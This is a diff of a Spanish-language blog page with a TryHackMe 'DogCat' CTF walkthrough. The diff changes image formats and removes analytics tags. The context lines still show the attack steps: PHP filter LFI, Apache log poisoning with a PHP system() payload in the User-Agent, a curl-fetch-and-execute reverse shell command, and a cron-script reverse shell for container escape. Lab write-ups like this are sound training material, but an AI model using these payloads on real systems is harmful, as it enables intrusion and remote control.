@@ -1249,8 +1249,8 @@
 <meta property="og:description" content="Writeups para maquinas de TryHackMe, HackTheBox, CTFs">
 
   
-    <meta property="og:image" content="https://sckull.github.io/images/posts/thm/dogcat/cover.png">
-    <meta property="og:image:url" content="https://sckull.github.io/images/posts/thm/dogcat/cover.png">
+    <meta property="og:image" content="https://sckull.github.io/images/posts/thm/dogcat/cover.webp">
+    <meta property="og:image:url" content="https://sckull.github.io/images/posts/thm/dogcat/cover.webp">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="sckull">
     <meta property="twitter:title" content="TryHackMe - DogCat">
@@ -1286,7 +1286,7 @@
     "url" : "https://sckull.github.io/posts/dogcat/",
     "description": "DogCat es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.",
     "keywords": ["linux"],
-    "image" : "https://sckull.github.io/images/posts/thm/dogcat/cover.png",
+    "image" : "https://sckull.github.io/images/posts/thm/dogcat/cover.webp",
     "author": {
       "@type": "Person",
       "name": "sckull"
@@ -1316,18 +1316,6 @@
     
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet"> 
 
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-2M568SGK9N"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-2M568SGK9N');
-</script>
-
-
-<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
 
 </head>
 
@@ -1574,7 +1562,7 @@
 
 
   <div class="featured-image__wrapper">
-    <img src="/images/posts/thm/dogcat/cover.png" alt="featured image" class="featured-image" style="width: ;height: ;">
+    <img src="/images/posts/thm/dogcat/cover.webp" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
 <h3 id="informacion-de-la-maquina">Informacion de la Maquina</h3>
@@ -1672,16 +1660,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div>
 </div><h2 id="http">HTTP</h2>
 <p>Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.07.10.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.07.10.webp" alt="image" /></p>
 <p>Vemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.10.03.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.10.03.webp" alt="image" /></p>
 <p>Por lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.</p>
 <h2 id="lfi---cat-or-dog">LFI - CAT OR DOG</h2>
 <p>Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje <code>Sorry, only dogs or cats are allowed.</code>.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.12.36.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.12.36.webp" alt="image" /></p>
 <p>Lo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje <code>Here you go!</code> y un error de la funcion <code>include()</code>. Desde aqui tiene un poco de sentido el mensaje de error anterior (<code>Sorry, only dogs or cats are allowed.</code>) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.</p>
 <p>Utilizamos <code>php://filter/convert.base64-encode/dog/resource=ARCHIVO</code> para leer archivos, en este caso leemos el archivo index.php que es el que utiliza <code>?view=</code>, logramos obtener el archivo en base64.</p>
-<p><img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.25.59.png" alt="image" /></p>
+<p><img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.25.59.webp" alt="image" /></p>
 <p>Logramos obtener el codigo fuente de index.php, logramos ver que hay una funcion que verifica si existe cat o dog dentro de la peticion, tambien vemos que podemos enviarle como parametro una extension de lo contrario la tomara como <code>.php</code>.</p>
 <details>
   <summary>**ALERTA DE SPOILER** `SPOILER` `SPOILER` `SPOILER`</summary>
@@ -1721,7 +1709,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div>
 </div></details>
 <p>Leemos el archivo flag.php y logramos leer nuestra primera flag.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.30.02.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.30.02.webp" alt="image" /></p>
 <h3 id="rce---apache-log-poisoning">RCE - Apache Log Poisoning</h3>
 <p>Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos <code>php://filter/dog/resource=../../../../var/log/apache2/access.log&amp;ext=</code> para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina <code>&amp;cmd=whoami</code>, por lo que luciría de la siguiente forma.</p>
 <p><a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/"><strong>Apache Log Poisoning</strong></a></p>
@@ -1738,7 +1726,7 @@ User-Agent:Mozilla/5.0 &lt;?php system<span class="o">(</span><span class="nv">$
 </code></pre></td></tr></table>
 </div>
 </div><p>Vemos que en la respuesta tenemos acceso como usuario <code>www-data</code>.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.webp" alt="image" /></p>
 <h2 id="user---www-data">USER - WWW-DATA</h2>
 <p>Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.</p>
 <p><strong>Comando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)</strong></p>
@@ -1757,12 +1745,12 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
 </code></pre></td></tr></table>
 </div>
 </div><p>Logramos obtener una shell con el usuario www-data.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.webp" alt="image" /></p>
 <p>Nuestra segunda flag.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.webp" alt="image" /></p>
 <h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
 <p>Hacemos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>env</code>. Utilizamos env para obtener una shell root.</p>
-<p><img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.png" alt="image" /></p>
+<p><img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.webp" alt="image" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1772,21 +1760,21 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
 </code></pre></td></tr></table>
 </div>
 </div><p>Òbtenemos nuestra shell como usuario root y nuestra tercera flag.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.22.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.22.webp" alt="image" /></p>
 <p>Tenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo <code>.dockerenv</code> por lo que en el lugar que estamos es un contenedor.</p>
 <p>Dentro de la carpeta <code>/opt/backup</code> encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.03.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.03.webp" alt="image" /></p>
 <p><strong>TCPDUMP</strong><br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.41.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.41.webp" alt="image" /></p>
 <p>Podemos deducir que existe un crontab que ejecuta el archibo backup.sh, ahora, agregamos una shell inversa a este archivo y ponemos a la escucha netcat en nuestra maquina y esperamos a que nos devuelva una shell.</p>
 <p><strong>SHELL</strong><br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.05.30.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.05.30.webp" alt="image" /></p>
 <p><strong>NETCAT</strong><br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.06.08.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.06.08.webp" alt="image" /></p>
 <p>Logramos obtener una shell y nuestra ultima flag.<br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.07.36.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.07.36.webp" alt="image" /></p>
 <p><strong>Crontab del archivo backup.sh</strong><br />
-<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.09.40.png" alt="image" /></p>
+<img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.09.40.webp" alt="image" /></p>
 
     </article>
     
